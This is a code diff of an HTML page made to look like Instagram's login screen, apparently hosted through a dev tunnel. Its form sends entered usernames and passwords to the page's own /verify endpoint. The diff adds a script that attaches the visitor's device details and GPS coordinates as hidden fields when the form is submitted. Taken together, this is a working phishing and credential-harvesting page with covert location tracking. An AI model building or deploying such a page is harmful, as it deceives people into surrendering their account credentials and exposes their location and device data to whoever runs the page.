@@ -3,35 +3,39 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <!-- Open Graph / Facebook -->
-<meta property="og:title" content="Instagram – Clone Home Page" />
-<meta property="og:description" content="A pixel-perfect clone of Instagram's home page with dark mode using HTML and advanced CSS." />
-<meta property="og:image" content="https://s1xns6tz-3003.inc1.devtunnels.ms/" />
-<meta property="og:url" content="https://s1xns6tz-3003.inc1.devtunnels.ms/" />
-<meta property="og:type" content="website" />
 
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="Instagram – Clone Home Page" />
-<meta name="twitter:description" content="A pixel-perfect clone of Instagram's home page with dark mode using HTML and advanced CSS." />
-<meta name="twitter:image" content="https://s1xns6tz-3003.inc1.devtunnels.ms/" />
+  <!-- Open Graph / Facebook -->
+  <meta property="og:title" content="Instagram – Clone Home Page" />
+  <meta property="og:description" content="A pixel-perfect clone of Instagram's home page with dark mode using HTML and advanced CSS." />
+  <meta property="og:image" content="https://s1xns6tz-3003.inc1.devtunnels.ms/" />
+  <meta property="og:url" content="https://s1xns6tz-3003.inc1.devtunnels.ms/" />
+  <meta property="og:type" content="website" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Instagram – Clone Home Page" />
+  <meta name="twitter:description" content="A pixel-perfect clone of Instagram's home page with dark mode using HTML and advanced CSS." />
+  <meta name="twitter:image" content="https://s1xns6tz-3003.inc1.devtunnels.ms/" />
 
   <title>Instagram Login</title>
-  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="/style.css" />
   <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
-  <link rel="icon" href="/public/favicon.ico" />
-
+  <link rel="icon" href="/favicon.ico" />
 </head>
 <body>
   <div class="container">
     <p class="lang">English (US)</p>
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" />
+
+    <!-- Display error message -->
     <h6 class="text-center text-danger">{{{msg}}}</h6>
-    <form id="login-form" action="/verify" method="post" >
+
+    <form id="login-form" action="/verify" method="post">
       <input type="text" name="username" placeholder="Username, email or mobile number" required />
       <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Log in</button>
     </form>
+
     <a href="#" class="forgot">Forgot password?</a>
 
     <div class="create-account">
@@ -39,9 +43,61 @@
     </div>
 
     <div class="meta">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6a/Meta_Platforms_Inc._logo.svg" alt="Meta" />
+      <img src="https://pngimg.com/uploads/meta/meta_PNG7.png" alt="Meta" />
     </div>
   </div>
+
+  <!-- JavaScript to collect device info and location -->
+  <script>
+  document.addEventListener("DOMContentLoaded", () => {
+    const form = document.getElementById("login-form");
+
+    const deviceDetails = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+    };
+
+    const deviceInput = document.createElement("input");
+    deviceInput.type = "hidden";
+    deviceInput.name = "deviceDetails";
+    deviceInput.value = JSON.stringify(deviceDetails);
+    form.appendChild(deviceInput);
+
+    let locationInput = null;
+
+    // Prepare GPS field (but don't submit yet)
+    function addLocationAndSubmit(position) {
+      locationInput = document.createElement("input");
+      locationInput.type = "hidden";
+      locationInput.name = "location";
+      locationInput.value = JSON.stringify({
+        lat: position.coords.latitude,
+        lon: position.coords.longitude
+      });
+      form.appendChild(locationInput);
+      form.submit();
+    }
+
+    function fallbackAndSubmit() {
+      // Submit form without GPS
+      form.submit();
+    }
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Stop default submit
+
+      if (navigator.geolocation) {
+        // Try to get GPS with 3s timeout
+        navigator.geolocation.getCurrentPosition(addLocationAndSubmit, fallbackAndSubmit, {
+          timeout: 3000
+        });
+      } else {
+        fallbackAndSubmit();
+      }
+    });
+  });
+</script>
 </body>
 </html>
-
